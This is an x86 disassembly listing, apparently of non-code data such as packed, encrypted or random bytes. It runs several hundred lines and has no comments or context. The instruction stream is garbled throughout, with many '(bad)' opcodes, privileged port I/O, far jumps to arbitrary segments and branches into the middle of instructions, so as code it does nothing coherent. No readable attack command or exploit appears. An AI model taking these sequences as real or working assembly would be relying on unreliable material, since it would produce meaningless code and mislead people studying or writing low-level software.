  420d5e:	mov    eax,ds:0xf27ac15c
  420d63:	imul   edx,esi,0xffffffca
  420d66:	ins    BYTE PTR es:[edi],dx
  420d67:	mov    al,0x82
  420d69:	lahf   
  420d6a:	cwde   
  420d6b:	push   ebx
  420d6c:	fsubr  QWORD PTR [edi]
  420d6e:	mov    dh,0x19
  420d70:	sub    dl,dh
  420d72:	rol    bl,1
  420d74:	out    0x88,al
  420d76:	out    0x32,eax
  420d78:	aad    0x15
  420d7a:	and    cl,BYTE PTR [ebx+0x45]
  420d7d:	xchg   ebx,eax
  420d7e:	pop    ss
  420d7f:	and    eax,0x61999627
  420d84:	inc    esp
  420d85:	xchg   esp,eax
  420d86:	pop    es
  420d87:	(bad)  [eax]
  420d89:	jg     0x420d9d
  420d8b:	mov    ds:0x2a5d775f,eax
  420d90:	push   edi
  420d91:	dec    esp
  420d92:	or     ah,BYTE PTR ds:0xe79a44a1
  420d98:	fwait
  420d99:	jecxz  0x420d24
  420d9b:	outs   dx,BYTE PTR ds:[esi]
  420d9c:	inc    ebp
  420d9d:	inc    edx
  420d9e:	and    bh,cl
  420da0:	jo     0x420d7a
  420da2:	not    DWORD PTR [eax]
  420da4:	inc    edx
  420da5:	sub    esi,DWORD PTR [eax+eiz*8+0x54]
  420da9:	sub    eax,0x6e3368a2
  420dae:	jmp    0x763697f3
  420db3:	div    edx
  420db5:	lods   al,BYTE PTR ds:[esi]
  420db6:	jno    0x420d42
  420db8:	jb     0x420d6d
  420dba:	repnz int3 
  420dbc:	mov    ebp,?
  420dbe:	dec    ecx
  420dbf:	inc    esi
  420dc0:	lds    esi,FWORD PTR [eax]
  420dc2:	jmp    0xe512:0x96227be1
  420dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dca:	ds inc esp
  420dcc:	int3   
  420dcd:	dec    ebx
  420dce:	arpl   WORD PTR [edi],bp
  420dd0:	loop   0x420dd8
  420dd2:	fidivr DWORD PTR [ebx+0x60d8a422]
  420dd8:	mov    al,0x15
  420dda:	imul   edx,DWORD PTR [ecx-0x1b69cbc9],0xea82df7b
  420de4:	nop
  420de5:	mov    eax,edi
  420de7:	jle    0x420dde
  420de9:	test   eax,0xdd17809f
  420dee:	cmc    
  420def:	xchg   edi,eax
  420df0:	in     eax,dx
  420df1:	cmc    
  420df2:	cwde   
  420df3:	xchg   ebx,eax
  420df4:	push   ds
  420df5:	inc    ebp
  420df6:	loope  0x420d9c
  420df8:	push   ss
  420df9:	pop    edx
  420dfa:	push   cs
  420dfb:	and    cl,BYTE PTR [ecx+0x5db2056d]
  420e01:	cld    
  420e02:	icebp  
  420e03:	rol    DWORD PTR [edi+0x7c],0xd4
  420e07:	push   edi
  420e08:	cs push esi
  420e0a:	fwait
  420e0b:	or     BYTE PTR [esi+0x1c4dabc1],bh
  420e11:	sub    esi,0x32
  420e14:	jo     0x420e5c
  420e16:	dec    ecx
  420e17:	push   0xffffffd0
  420e19:	xchg   ebp,eax
  420e1a:	ficomp DWORD PTR [ebp+0x54]
  420e1d:	jmp    0xa7e7:0xf67a815d
  420e24:	push   ds
  420e25:	and    BYTE PTR [eax],0xe8
  420e28:	ror    edx,0x2
  420e2b:	dec    edi
  420e2c:	inc    ecx
  420e2d:	scas   al,BYTE PTR es:[edi]
  420e2e:	fs xchg edx,eax
  420e30:	jbe    0x420e0e
  420e32:	popf   
  420e33:	jp     0x420e22
  420e35:	jo     0x420dc0
  420e37:	je     0x420dd7
  420e39:	aaa    
  420e3a:	jne    0x420e57
  420e3c:	dec    edx
  420e3d:	adc    DWORD PTR [edi-0x68],ebx
  420e40:	hlt    
  420e41:	dec    ebx
  420e42:	sbb    eax,0x28e27808
  420e47:	ret    0xbdb0
  420e4a:	inc    ebx
  420e4b:	jae    0x420e50
  420e4d:	or     bh,BYTE PTR ds:0x7ebeb2f5
  420e53:	xor    edx,eax
  420e55:	adc    eax,ebp
  420e57:	fisub  WORD PTR [ecx+eiz*2-0x3d9b6f52]
  420e5e:	sub    BYTE PTR [eax+edx*1-0x6a],bl
  420e62:	mov    eax,edi
  420e64:	loopne 0x420e88
  420e66:	jp     0x420e50
  420e68:	repnz pop eax
  420e6a:	int3   
  420e6b:	aaa    
  420e6c:	imul   eax,DWORD PTR [ecx+eax*1-0x1a530a8c],0x3b3ce932
  420e77:	sbb    bl,ch
  420e79:	jns    0x420ef6
  420e7b:	fs call 0xbe735d22
  420e81:	adc    BYTE PTR [edx-0x7f],cl
  420e84:	repz repz mov ebx,0x6fe72cb1
  420e8b:	cld    
  420e8c:	in     eax,0x21
  420e8e:	adc    edx,DWORD PTR [edi-0x328da7f2]
  420e94:	pop    ebx
  420e95:	into   
  420e96:	clc    
  420e97:	test   BYTE PTR [ecx+ebp*4-0xb],dh
  420e9b:	mov    esi,0xa0ecca4a
  420ea0:	sub    DWORD PTR [edi],esi
  420ea2:	sbb    eax,0x41271ca2
  420ea7:	stc    
  420ea8:	xchg   ecx,eax
  420ea9:	jl     0x420e42
  420eab:	shr    DWORD PTR [edi+0x6f5f03d9],1
  420eb1:	sbb    BYTE PTR [edx+0x20],dl
  420eb4:	test   eax,0xb3387388
  420eb9:	jmp    FWORD PTR [ecx+0x64]
  420ebc:	test   eax,0xfd887da9
  420ec1:	sbb    cl,BYTE PTR ds:[ebx-0x3f]
  420ec5:	xor    esp,DWORD PTR [ecx]
  420ec7:	xchg   ebp,eax
  420ec8:	mov    eax,0x6cdb0dce
  420ecd:	add    ch,BYTE PTR [edi+0x1c]
  420ed0:	xchg   esi,eax
  420ed1:	int3   
  420ed2:	or     bh,al
  420ed4:	aaa    
  420ed5:	jl     0x420ed3
  420ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ed8:	mul    DWORD PTR [edi+0x789f2aa2]
  420ede:	dec    ecx
  420edf:	les    ebx,FWORD PTR [ebp+0x2c]
  420ee2:	or     al,0x3e
  420ee4:	xchg   esi,eax
  420ee5:	lods   al,BYTE PTR ds:[esi]
  420ee6:	les    ebp,FWORD PTR [ebx+0x71]
  420ee9:	cmc    
  420eea:	add    eax,0xa071e5cd
  420eef:	xacquire xchg BYTE PTR cs:[esi+0x478bc7c7],bl
  420ef7:	sahf   
  420ef8:	push   esp
  420ef9:	in     eax,dx
  420efa:	fcom   QWORD PTR [esi-0x9a14262]
  420f00:	push   edx
  420f01:	(bad)  
  420f03:	xor    eax,0x3344a4ed
  420f08:	call   0xcfa9:0xa30b
  420f0e:	mov    bh,0x2f
  420f10:	mov    bh,0xe9
  420f12:	pushf  
  420f13:	not    dh
  420f15:	jl     0x420f6c
  420f17:	ins    DWORD PTR es:[edi],dx
  420f18:	or     bl,bl
  420f1a:	mov    ecx,0x2605581d
  420f1f:	mov    edi,ebx
  420f21:	arpl   dx,cx
  420f23:	scas   al,BYTE PTR es:[edi]
  420f24:	or     eax,0x5d830b76
  420f29:	sub    bl,ah
  420f2b:	pop    ecx
  420f2c:	add    eax,0x1e01e8ea
  420f31:	out    0x2a,eax
  420f33:	push   0xb519e7bd
  420f38:	out    0xbe,eax
  420f3a:	jns    0x420f42
  420f3c:	(bad)  
  420f3d:	jns    0x420ef4
  420f3f:	xchg   ebp,eax
  420f40:	add    BYTE PTR [ebx+edx*2],dh
  420f43:	test   DWORD PTR [eax],esp
  420f45:	xchg   ebp,eax
  420f46:	jg     0x420ed0
  420f48:	jo     0x420f67
  420f4a:	rol    DWORD PTR [ebx+0x3a17e963],cl
  420f50:	lock dec esi
  420f52:	mov    ebx,0xa53aa75d
  420f57:	gs enter 0x23b5,0x92
  420f5c:	or     eax,0x49badb5f
  420f61:	xor    ecx,DWORD PTR [edx+0x74c1260e]
  420f67:	inc    edx
  420f68:	out    0xd1,al
  420f6a:	xchg   cl,bl
  420f6c:	mov    WORD PTR [edi+0x17],es
  420f6f:	sub    eax,0x55d39901
  420f74:	inc    DWORD PTR es:[edx]
  420f77:	jge    0x420f0d
  420f79:	xchg   esi,eax
  420f7a:	xor    bl,0x1b
  420f7d:	sbb    ebp,esi
  420f7f:	jle    0x420f87
  420f81:	dec    eax
  420f82:	xor    al,0xb0
  420f84:	sar    BYTE PTR [ecx+0x23],1
  420f87:	ja     0x420fc4
  420f89:	scas   al,BYTE PTR es:[edi]
  420f8a:	xchg   edi,eax
  420f8b:	outs   dx,DWORD PTR ds:[esi]
  420f8c:	push   edi
  420f8d:	sbb    bh,dl
  420f8f:	fdivr  st,st(7)
  420f91:	imul   edi,DWORD PTR [ebx],0x5a8f1fe
  420f97:	lods   al,BYTE PTR ds:[esi]
  420f98:	fld    TBYTE PTR [eax]
  420f9a:	sti    
  420f9b:	mov    ebx,0xb347d2ab
  420fa0:	retf   0x4760
  420fa3:	sbb    DWORD PTR [esi-0x15ebb33a],ebx
  420fa9:	ret    
  420faa:	mov    eax,0x7a95383
  420faf:	mov    eax,0x3133aaa1
  420fb4:	mov    dh,0x6d
  420fb6:	mov    WORD PTR [edi+0x44e6eca],fs
  420fbc:	mov    ds:0x7e567ec8,eax
  420fc1:	out    0xd2,eax
  420fc3:	scas   eax,DWORD PTR es:[edi]
  420fc4:	and    BYTE PTR ds:0xda2e1df4,ah
  420fca:	(bad)  
  420fcb:	jno    0x420f89
  420fcd:	pop    esp
  420fce:	mov    al,0x91
  420fd0:	in     eax,dx
  420fd1:	sub    DWORD PTR [esi],0x63c46a74
  420fd7:	loopne 0x420f6d
  420fd9:	mov    ds:0x29b9d5c4,al
  420fde:	sbb    DWORD PTR [ebp*8+0x77374401],esi
  420fe5:	fsubp  st(6),st
  420fe7:	(bad)  
  420fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fe9:	jp     0x420fc6
  420feb:	out    0x57,eax
  420fed:	or     DWORD PTR [edi],edx
  420fef:	cmp    BYTE PTR [edx+0x7c],cl
  420ff2:	test   eax,0xba9ef5f8
  420ff7:	cmp    dh,BYTE PTR [edx]
  420ff9:	push   ds
  420ffa:	fwait
  420ffb:	mov    cl,0x5d
  420ffd:	push   edx
  420ffe:	(bad)  es:[ebp+ecx*1+0x45]
  421003:	mov    al,fs:0x1e577bf2
  421009:	inc    eax
  42100a:	popf   
  42100b:	rol    BYTE PTR [edx],1
  42100d:	fcomp  DWORD PTR [edi]
  42100f:	cdq    
  421010:	sub    cl,dl
  421012:	mov    ds,WORD PTR [edi-0x6]
  421015:	call   0x35715b96
  42101a:	cwde   
  42101b:	loop   0x420fbb
  42101d:	and    BYTE PTR [esi+0x4ab166bf],dh
  421023:	jge    0x420fe0
  421025:	pop    esp
  421026:	leave  
  421027:	mov    ebx,0xa839bd33
  42102c:	fsubr  QWORD PTR [ecx]
  42102e:	jl     0x42105d
  421030:	mov    bh,0x93
  421032:	xor    DWORD PTR [ebp+edx*8-0x43],0xfffffff3
  421037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421039:	cwde   
  42103a:	ins    DWORD PTR es:[edi],dx
  42103b:	scas   al,BYTE PTR es:[edi]
  42103c:	adc    bh,0x50
  42103f:	add    dl,BYTE PTR [eax+ebx*4]
  421042:	aad    0xed
  421044:	jne    0x421086
  421046:	sti    
  421047:	loopne 0x421046
  421049:	outs   dx,DWORD PTR ds:[esi]
  42104a:	mov    cl,BYTE PTR ss:[edi+0x67]
  42104e:	mov    edi,0x4c0ee953
  421053:	pop    ebx
  421054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421055:	dec    ebp
  421056:	ss aam 0x71
  421059:	pop    eax
  42105a:	add    cl,BYTE PTR [edi]
  42105c:	sbb    edi,DWORD PTR [edi]
  42105e:	repz ja 0x42106c
  421061:	shr    BYTE PTR [ebp-0x13],cl
  421064:	jg     0x4210bc
  421066:	add    eax,0x628a761f
  42106b:	pusha  
  42106c:	out    0xc,eax
  42106e:	mov    ecx,0x63ede5a0
  421073:	js     0x421059
  421075:	mov    esi,0x7c6d2405
  42107a:	jl     0x421009
  42107c:	mov    ebx,0xb7cc8080
  421081:	popa   
  421082:	push   esp
  421083:	jg     0x421012
  421085:	cmovns eax,DWORD PTR gs:[ebx+0x62]
  42108a:	inc    esi
  42108b:	ins    DWORD PTR es:[edi],dx
  42108c:	jge    0x4210e6
  42108e:	(bad)  
  42108f:	ror    DWORD PTR [esi-0x9],cl
  421092:	ret    0x6a35
  421095:	push   0xffffff96
  421097:	inc    BYTE PTR [ebp+0x502376c]
  42109d:	and    BYTE PTR ds:0x210e03eb,ah
  4210a3:	out    0x3b,al
  4210a5:	jno    0x4210c9
  4210a7:	out    0xfe,al
  4210a9:	test   al,0xef
  4210ab:	(bad)  
  4210ad:	(bad)  
  4210ae:	push   eax
  4210af:	add    BYTE PTR [edi+0x667d498e],0xf6
  4210b6:	sbb    al,cl
  4210b8:	lods   al,BYTE PTR ds:[esi]
  4210b9:	mov    ebp,0x73a65dd3
  4210be:	push   ds
  4210bf:	scas   eax,DWORD PTR es:[edi]
  4210c0:	add    al,0xb4
  4210c2:	push   cs
  4210c3:	jp     0x42109c
  4210c5:	push   ebx
  4210c6:	push   esi
  4210c7:	jp     0x4210f6
  4210c9:	retf   
  4210ca:	adc    BYTE PTR [ebx-0x47],bh
  4210cd:	jl     0x4210ad
  4210cf:	adc    DWORD PTR [eax-0x4efe4183],0xfffffff4
  4210d6:	mov    eax,ds:0xd29310a5
  4210db:	adc    al,0xd5
  4210dd:	xchg   edx,eax
  4210de:	lds    esi,FWORD PTR [edi+eiz*8-0xc65ff31]
  4210e5:	lods   eax,DWORD PTR ds:[esi]
  4210e6:	or     eax,0x8a458bf2
  4210eb:	(bad)  
  4210ec:	push   eax
  4210ed:	jns    0x42115c
  4210ef:	xchg   edx,eax
  4210f0:	ins    DWORD PTR es:[edi],dx
  4210f1:	das    
  4210f2:	push   ss
  4210f3:	cli    
  4210f4:	idiv   DWORD PTR [ebx-0x49]
  4210f7:	xchg   DWORD PTR [esi+0x52098e4c],edx
  4210fd:	ins    DWORD PTR es:[edi],dx
  4210fe:	sti    
  4210ff:	adc    ebp,DWORD PTR [esi]
  421101:	add    al,0x57
  421103:	sar    DWORD PTR [edi+0x7f],cl
  421106:	out    0xbc,al
  421108:	(bad)  
  421109:	or     al,0x34
  42110b:	sbb    al,cl
  42110d:	fdiv   DWORD PTR [eax+0x5c]
  421110:	nop
  421111:	inc    esp
  421112:	xor    BYTE PTR [ebx+edx*8],bl
  421115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421116:	jae    0x4210c8
  421118:	retf   
  421119:	xor    edi,DWORD PTR [ecx-0x2d]
  42111c:	lahf   
  42111d:	pushf  
  42111e:	lods   eax,DWORD PTR ds:[esi]
  42111f:	adc    al,0x4d
  421121:	push   edi
  421122:	gs sbb esp,edx
  421125:	jg     0x421165
  421127:	idiv   DWORD PTR [edx]
  421129:	js     0x42119c
  42112b:	dec    esp
  42112c:	add    DWORD PTR [edx],ebp
  42112e:	pushf  
  42112f:	mov    eax,ds:0x9c9e7689
  421134:	mov    eax,ds:0x534f2923
  421139:	sbb    eax,0x98b989d3
  42113e:	lods   al,BYTE PTR ds:[esi]
  42113f:	jle    0x42115a
  421141:	and    BYTE PTR [edi+esi*8+0x1ac9e66a],cl
  421148:	popf   
  421149:	dec    esi
  42114a:	jl     0x4211ad
  42114c:	mov    bh,0x94
  42114e:	in     al,0xf3
  421150:	and    BYTE PTR [esi],dh
  421152:	xchg   DWORD PTR [esi+0x51],edi
  421155:	and    dl,cl
  421157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421158:	das    
  421159:	not    DWORD PTR [edx+edx*2+0x61f3bc1a]
  421160:	sub    BYTE PTR [eax],0x84
  421163:	pop    eax
  421164:	in     eax,dx
  421165:	stos   BYTE PTR es:[edi],al
  421166:	lea    edi,[edx+0x4dca0702]
  42116c:	shr    BYTE PTR [edx],0xc3
  42116f:	ins    DWORD PTR es:[edi],dx
  421170:	push   ebp
  421171:	inc    ebp
  421172:	outs   dx,BYTE PTR ds:[esi]
  421173:	pop    eax
  421174:	in     eax,0x17
  421176:	inc    esp
  421177:	repz fsubrp st(1),st
  42117a:	adc    BYTE PTR [ecx],0x11
  42117d:	dec    ebx
  42117e:	push   ds
  42117f:	shr    BYTE PTR [ecx-0x3],cl
  421182:	xor    BYTE PTR [ecx-0x55],dl
  421185:	lods   al,BYTE PTR ss:[esi]
  421187:	ret    
  421188:	mov    eax,ds:0x6fb929f6
  42118d:	jmp    0xac33:0x8db28892
  421194:	mov    WORD PTR [ebx-0x37],gs
  421197:	pop    edx
  421198:	std    
  421199:	iret   
  42119a:	test   DWORD PTR [edx],edx
  42119c:	jbe    0x4211e7
  42119e:	dec    eax
  42119f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a0:	es (bad) 
  4211a2:	aad    0x0
  4211a4:	push   edi
  4211a5:	adc    BYTE PTR [ebx-0x3e1ec793],al
  4211ab:	imul   eax,DWORD PTR [ebp+0x63a71c54],0xfffffff2
  4211b2:	bound  eax,QWORD PTR [edx+0x61bc6189]
  4211b8:	sbb    al,0x9a
  4211ba:	jmp    0x42122a
  4211bc:	outs   dx,BYTE PTR ds:[esi]
  4211bd:	add    DWORD PTR [ecx],edi
  4211bf:	xlat   BYTE PTR ds:[ebx]
  4211c0:	dec    esp
  4211c1:	xlat   BYTE PTR ds:[ebx]
  4211c3:	std    
  4211c4:	mov    bh,0xa4
  4211c6:	or     al,0xc
  4211c8:	jns    0x4211c7
  4211ca:	not    BYTE PTR [edi-0x4ce04605]
  4211d0:	inc    ecx
  4211d1:	inc    ecx
  4211d2:	dec    ebx
  4211d3:	adc    eax,DWORD PTR [ecx+0x56]
  4211d6:	jecxz  0x421176
  4211d8:	or     DWORD PTR [edi],ebx
  4211da:	push   ebx
  4211db:	sbb    al,0x9e
  4211dd:	dec    cl
  4211df:	jmp    0xe201:0xe6f0c348
  4211e6:	daa    
  4211e7:	push   ds
  4211e8:	pop    edx
  4211e9:	and    al,0xd3
  4211eb:	mov    esi,0xdf2febde
  4211f0:	adc    bh,ch
  4211f2:	xor    eax,0x37443c6
  4211f7:	or     DWORD PTR [edi],esp
  4211f9:	out    0x9,al
  4211fb:	addr16 sub al,0x14
  4211fe:	in     eax,0xfe
  421200:	jl     0x42127b
  421202:	mov    ds:0xdc001a19,al
  421207:	cld    
  421208:	xchg   edx,eax
  421209:	push   0x351b85f0
  42120e:	inc    ebp
  42120f:	shl    BYTE PTR [esi+0x21],0xe3
  421213:	xchg   ebp,esi
  421215:	xchg   esi,eax
  421216:	cmc    
  421217:	xchg   ebx,eax
  421218:	push   edi
  421219:	repnz push ebp
  42121b:	call   0x5d802e71
  421220:	xor    ebp,DWORD PTR [edx+0x40]
  421223:	push   ds
  421224:	inc    edi
  421225:	xor    al,0x17
  421227:	and    al,0x57
  421229:	dec    edi
  42122a:	aaa    
  42122b:	aas    
  42122c:	xor    ebx,DWORD PTR [esi-0x1a]
  42122f:	imul   ebp,DWORD PTR [edi+ecx*4-0x4b],0xffffffa0
  421234:	jmp    0x4211c6
  421236:	pop    edi
  421237:	push   DWORD PTR [edi-0x71308c9c]
  42123d:	mov    ebx,0x2f384fb4
  421242:	scas   al,BYTE PTR es:[edi]
  421243:	(bad)  
  421244:	test   al,0xa5
  421246:	pusha  
  421247:	fisubr DWORD PTR [ebp-0x3fc750ac]
  42124d:	sub    eax,0x4c0557d0
  421252:	add    ecx,ecx
  421254:	stos   DWORD PTR es:[edi],eax
  421255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421256:	std    
  421257:	and    al,0xdd
  421259:	fsubr  DWORD PTR [eax]
  42125b:	rcr    DWORD PTR [edi-0x1c1f63e4],cl
  421261:	cmp    BYTE PTR [ebx-0x48],ch
  421264:	mov    dl,0x4d
  421266:	mov    si,0x5382
  42126a:	out    dx,eax
  42126b:	adc    BYTE PTR [ebx],al
  42126d:	or     DWORD PTR [ebx],esi
  42126f:	adc    BYTE PTR [ebx+edx*2],bh
  421272:	jecxz  0x42123a
  421274:	mov    eax,ds:0x75da4939
  421279:	and    eax,DWORD PTR [eax+0x4]
  42127c:	cli    
  42127d:	push   0xc7dead43
  421282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421283:	jl     0x4212f4
  421285:	cmp    BYTE PTR [edx-0x51],al
  421288:	jmp    0xe3fca8f
  42128d:	add    eax,0x21a25c51
  421292:	aas    
  421293:	mov    ds:0x859f9caa,al
  421298:	iret   
  421299:	ins    BYTE PTR es:[edi],dx
  42129a:	mov    ebp,0xcf5833fd
  42129f:	dec    ecx
  4212a0:	pop    ss
  4212a1:	popf   
  4212a2:	gs sub al,0xc4
  4212a5:	ret    
  4212a6:	je     0x42130a
  4212a8:	in     eax,dx
  4212a9:	mov    eax,ds:0x46b6a6c7
  4212ae:	je     0x421320
  4212b0:	in     eax,dx
  4212b1:	mov    ?,WORD PTR [eax+0x4c]
  4212b4:	pop    es
  4212b5:	pop    ebp
  4212b6:	cwde   
  4212b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212b8:	aaa    
  4212b9:	out    dx,al
  4212ba:	out    dx,al
  4212bb:	imul   ebp,DWORD PTR [ebp+0x22],0xffffffac
  4212bf:	xor    DWORD PTR [edi],0xfdb0a57
  4212c5:	xchg   edx,eax
  4212c6:	mov    al,BYTE PTR [edx+0x78]
  4212c9:	mov    eax,0x77c0fb29
  4212ce:	jge    0x421278
  4212d0:	xor    cl,dl
  4212d2:	call   0x56ef:0xbcc39957
  4212d9:	mov    ds:0x6e6f3186,eax
  4212de:	daa    
  4212df:	pushf  
  4212e0:	int    0xef
  4212e2:	ret    
  4212e3:	imul   DWORD PTR [edi+0x66]
  4212e6:	in     eax,0x2
  4212e8:	xlat   BYTE PTR ds:[ebx]
  4212e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212ea:	cld    
  4212eb:	fcom   st(7)
  4212ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ee:	out    0xf6,eax
  4212f0:	mov    eax,ds:0xbbe91856
  4212f5:	xchg   esi,eax
  4212f6:	popf   
  4212f7:	mov    ecx,DWORD PTR [eax+0x872a9aa]
  4212fd:	dec    edx
  4212fe:	pop    ecx
  4212ff:	daa    
  421300:	xchg   esp,eax
  421301:	std    
  421302:	call   0xf90b18f4
  421307:	push   cs
  421308:	test   DWORD PTR [eax-0x554d1301],esp
  42130e:	and    dh,0x4
  421311:	pop    ebp
  421312:	xchg   DWORD PTR [ebp+0x2f53bda6],eax
  421318:	or     eax,0x5b25751b
  42131d:	xchg   ecx,eax
  42131e:	call   0x22062a4b
  421323:	(bad)  
  421324:	mov    eax,0x44b8dfeb
  421329:	repnz loope 0x4212c8
  42132c:	and    BYTE PTR [eax],0xaa
  42132f:	aas    
  421330:	jae    0x4213ad
  421332:	mov    ecx,DWORD PTR [ecx-0x96f0275]
  421338:	mov    edx,0xe73b59ee
  42133d:	mov    cl,0x60
  42133f:	inc    edi
  421340:	jae    0x42130b
  421342:	out    0x1e,eax
  421344:	mov    edi,0x4ed06ab4
  42134a:	stos   DWORD PTR es:[edi],eax
  42134b:	aad    0x99
  42134d:	cmp    al,0x32
  42134f:	dec    ebp
  421350:	jle    0x421387
  421352:	sbb    al,BYTE PTR [bx+si]
  421355:	enter  0xa3d0,0x63
  421359:	daa    
  42135a:	call   0x1ee297a1
  42135f:	jl     0x42131a
  421361:	jmp    0x400b:0xac68737b
  421368:	adc    ah,dh
  42136a:	js     0x421361
  42136c:	mov    WORD PTR [edi],gs
  42136e:	mov    dh,0x9b
  421370:	in     eax,dx
  421371:	out    dx,al
  421372:	sub    eax,0x34eed6ab
  421377:	fiadd  WORD PTR [eax+0x7993cf08]
  42137d:	push   ebp
  42137e:	xchg   ebp,eax
  42137f:	jb     0x421396
  421381:	push   edx
  421382:	mov    esi,0x887c831e
  421387:	sbb    eax,0xc75d4c9c
  42138c:	fwait
  42138d:	jecxz  0x4213c7
  42138f:	mov    ebp,0xaff7105b
  421394:	dec    ecx
  421395:	sub    DWORD PTR ds:0xc13a00c2,edi
  42139b:	mov    dh,bl
  42139d:	fs mov bl,0x87
  4213a0:	jnp    0x421393
  4213a2:	outs   dx,DWORD PTR ds:[esi]
  4213a3:	fimul  DWORD PTR [eax-0xe]
  4213a6:	fldpi  
  4213a8:	mov    BYTE PTR [edi],bh
  4213aa:	sar    DWORD PTR [esi],0xd5
  4213ad:	jbe    0x421422
  4213af:	and    ah,0x75
  4213b2:	sub    eax,0xc00f4c9
  4213b7:	inc    edi
  4213b8:	imul   esp,DWORD PTR [eax-0x53b184d],0x322fc51
  4213c2:	push   0xc87c0e83
  4213c7:	xchg   edi,eax
  4213c8:	sbb    eax,0x1dc9ab09
  4213cd:	push   edx
  4213ce:	cmp    DWORD PTR [edx-0x42a51914],ebp
  4213d4:	sti    
  4213d5:	test   DWORD PTR [ebx+0x7178e53e],esp
  4213db:	lock fdivr QWORD PTR [esi+edi*8+0x2dba949e]
  4213e3:	(bad)  
  4213e4:	lods   al,BYTE PTR ds:[esi]
  4213e5:	pop    ss
  4213e6:	sub    ebp,ebx
  4213e8:	pop    eax
  4213e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213ea:	dec    ecx
  4213eb:	stc    
  4213ec:	mov    ebp,0xa9c41d0e
  4213f1:	or     al,dl
  4213f3:	adc    ah,BYTE PTR [esi-0x6d0859cc]
  4213f9:	jmp    0x8cfd:0xc1b0c917
  421400:	nop
  421401:	add    ch,al
  421403:	mov    ebx,edx
  421405:	dec    ebx
  421406:	xchg   edi,eax
  421407:	hlt    
  421408:	or     cl,BYTE PTR [ecx]
  42140a:	xor    BYTE PTR [eax+eiz*4],ah
  42140d:	cmc    
  42140e:	mov    bh,0x81
  421410:	inc    eax
  421411:	push   ecx
  421412:	mov    DWORD PTR [esi],ecx
  421414:	enter  0xb460,0x9
  421418:	nop
  421419:	sbb    eax,0x48facc8f
  42141e:	dec    esi
  42141f:	xchg   esp,eax
  421420:	mov    eax,ds:0xbcbe5374
  421425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421426:	mov    esi,0x66337e9f
  42142b:	xor    eax,0x89bf4db9
  421430:	mov    cl,0xc2
  421432:	nop
  421433:	ja     0x421453
  421435:	(bad)  
  421437:	sub    edi,DWORD PTR [eax+edx*4]
  42143a:	leave  
  42143b:	mov    ch,0x70
  42143d:	or     DWORD PTR es:[edi],ebx
  421440:	mov    ds:0x45e53c6a,al
  421445:	push   ss
  421446:	jmp    0x9410:0xa9663609
  42144d:	pop    edx
  42144e:	push   esi
  42144f:	inc    ebp
  421450:	jns    0x4213f2
  421452:	in     eax,dx
  421453:	push   ecx
  421454:	lock test BYTE PTR fs:[edi+0x4d9bb36a],dh
  42145c:	adc    al,0x46
  42145e:	call   0xbf61:0x9c51fe42
  421465:	(bad)  
  421466:	fimul  WORD PTR [ebx-0x65]
  421469:	and    dh,BYTE PTR [ecx+0x58]
  42146c:	add    BYTE PTR [edi+0x43],bl
  42146f:	sbb    DWORD PTR [ebp+0x64],eax
  421472:	sbb    al,0x0
  421474:	imul   ecx,DWORD PTR [eax],0x52f05d90
  42147a:	iret   
  42147b:	(bad)  
  42147c:	jmp    0xf1451e5f
  421481:	test   al,0x3e
  421483:	and    eax,0xae3034c6
  421488:	mov    ch,0xfb
  42148a:	rcr    BYTE PTR [edi+0x2c],1
  42148d:	and    ah,0x85
  421490:	dec    edx
  421491:	sub    si,WORD PTR es:[ebx+0x14809072]
  421499:	or     BYTE PTR [ecx-0x16],0x48
  42149d:	sub    al,0x77
  42149f:	outs   dx,DWORD PTR ds:[esi]
  4214a0:	repnz push 0x3188839a
  4214a6:	out    0x78,eax
  4214a8:	jp     0x4214f9
  4214aa:	dec    ecx
  4214ab:	pusha  
  4214ac:	in     eax,dx
  4214ad:	xor    eax,0xd54020d8
  4214b2:	faddp  st(3),st
  4214b4:	add    DWORD PTR [edx-0x53],esp
  4214b7:	jnp    0x421481
  4214b9:	pop    eax
  4214ba:	or     DWORD PTR [eax+eiz*4+0x24],esi
  4214be:	push   edx
  4214bf:	test   BYTE PTR [ebp+0x62],dl
  4214c2:	lahf   
  4214c3:	sar    DWORD PTR [ebx+0x74],1
  4214c6:	jbe    0x421504
  4214c8:	and    BYTE PTR [ebx-0x2],cl
  4214cb:	add    eax,0x41387cd7
  4214d0:	push   edi
  4214d1:	mov    dl,0xb2
  4214d3:	jae    0x4214e4
  4214d5:	ss iret 
  4214d7:	fisttp WORD PTR [eax-0x75]
  4214da:	xlat   BYTE PTR ds:[ebx]
  4214db:	mov    bh,0xb5
  4214dd:	js     0x42147e
  4214df:	sub    eax,0xa52521ad
  4214e4:	je     0x421515
  4214e6:	adc    al,0xbe
  4214e8:	xchg   DWORD PTR [esp+ecx*1+0x27],ebx
  4214ec:	inc    eax
  4214ed:	push   ds
  4214ee:	cli    
  4214ef:	pop    ebp
  4214f0:	enter  0xe5a0,0x84
  4214f4:	es cmp ecx,ecx
  4214f7:	and    ebp,DWORD PTR [edi]
  4214f9:	loopne 0x4214e9
  4214fb:	adc    ecx,DWORD PTR [edx+0x62ea52aa]
  421501:	gs jg  0x421582
  421504:	mov    ah,BYTE PTR ds:0x7ed0a1d7
  42150a:	shr    eax,cl
  42150c:	xchg   ecx,eax
  42150d:	les    edi,FWORD PTR [ebp-0x5b]
  421510:	mov    ecx,0x2587a60c
  421515:	xchg   ebx,eax
  421516:	and    BYTE PTR [eax-0x2530622f],al
  42151c:	mov    ebx,ecx
  42151e:	mov    al,ds:0x49b90571
  421523:	lock cmp DWORD PTR [edi+0x5e],0xffffff9b
  421528:	mov    al,0x6f
  42152a:	ret    
  42152b:	dec    edi
